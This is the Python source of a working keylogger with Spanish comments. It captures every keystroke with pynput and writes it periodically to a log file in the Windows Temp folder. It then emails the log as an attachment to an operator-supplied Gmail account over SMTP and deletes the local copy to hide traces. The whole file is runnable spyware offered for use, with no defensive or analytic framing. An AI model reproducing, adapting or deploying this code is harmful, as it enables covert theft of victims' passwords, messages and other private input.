from datetime import datetime
from pathlib import Path
import pynput.keyboard
from threading import Timer
from os import path, remove

# edit 
email = '' #correo de gmail
password = '' #password email
time_save_data = 15 # default 15 seg
time_send_email = 303 # default 5 minutos


key_esp = {'Key.space':' ', 'Key.enter':'\n','Key.backspace':" _BDEL_ ", 'Key.delete': ' _DEL_ ', 'Key.caps_lock':' _MAYUS_ '}
numpad = {96:'0', 97:'1',98:'2', 99:'3', 100:'4', 101:'5', 102:'6', 103:'7', 104:'8', 105:'9', 110:'.'}
class Keylogger():
    def __init__(self, time1, time2 , email, password):
        self.time_write_file = time1
        self.time_login_email = time2
        self.login_email = email
        self.login_password = password
        self.date = datetime.today().strftime('%d%m%Y')
        self.hour = datetime.today().strftime('%H:%M')
        self.log_file = 'register_'
        self.log_file_path = str(Path.home()) + '\\AppData\\Local\\Temp\\' + self.log_file + self.date
        self.log_content = ''
        self.email()
    def concat_log(self, key):
        self.log_content += key
    def key_press(self,key):
        try:
            if hasattr(key, 'vk') and key.vk in numpad.keys():
                data = numpad.get(key.vk)
            else:
                data = str(key.char)
        except AttributeError:
            if str(key) in key_esp.keys():
                data = key_esp.get(str(key))
            else:
                data = ''
        self.concat_log(data)
    def write_log_file(self, d):
        with open(f"{self.log_file_path}", "a") as log_file_in:
            log_file_in.write(d)
            log_file_in.close()
    def send_data_email(self):
        if path.exists(self.log_file_path):
            with open(f'{self.log_file_path}', 'r') as log_file_read:
                from email.mime.application import MIMEApplication
                from email.mime.multipart import MIMEMultipart
                from email.mime.text import MIMEText
                import smtplib
                log_file_content = str(log_file_read.read())
                body_email_content = MIMEMultipart()
                body_email_content['From'] = self.login_email
                body_email_content['To'] = self.login_email
                body_email_content['Subject'] = self.log_file + self.date + "_" + self.hour           
                body_email_content.attach(MIMEText(log_file_content, 'plain'))
                upload_file = MIMEApplication(open(f'{self.log_file_path}', 'rb').read())
                upload_file.add_header('Content-Disposition', 'attachment', filename = '%s.txt' %(self.log_file_path))
                body_email_content.attach(upload_file)
                all_content = body_email_content.as_string()
                with smtplib.SMTP('smtp.gmail.com', 587) as email_connection:
                    try:
                        email_connection.starttls()
                        email_connection.login(self.login_email, self.login_password)
                        email_connection.sendmail(self.login_email, self.login_email, all_content)
                        email_connection.quit()
                        log_file_read.close()
                        remove(self.log_file_path)
                        print('Envio Exitoso...')
                    except smtplib.SMTPAuthenticationError:
                        pass
    def capture_data(self):
        if self.log_content != "":
            self.write_log_file(self.log_content)
        self.log_content = ""
        capture_thread = Timer(self.time_write_file, self.capture_data)
        capture_thread.start()
    def email(self):
        self.send_data_email()
        email_thread = Timer(self.time_login_email, self.email)
        email_thread.start()
    def run(self):
        input_key = pynput.keyboard.Listener(on_press = self.key_press)
        with input_key:
            self.capture_data()
            input_key.join()
if __name__ == '__main__':
    keylog = Keylogger(time_save_data, time_send_email, email, password)
    keylog.run()  
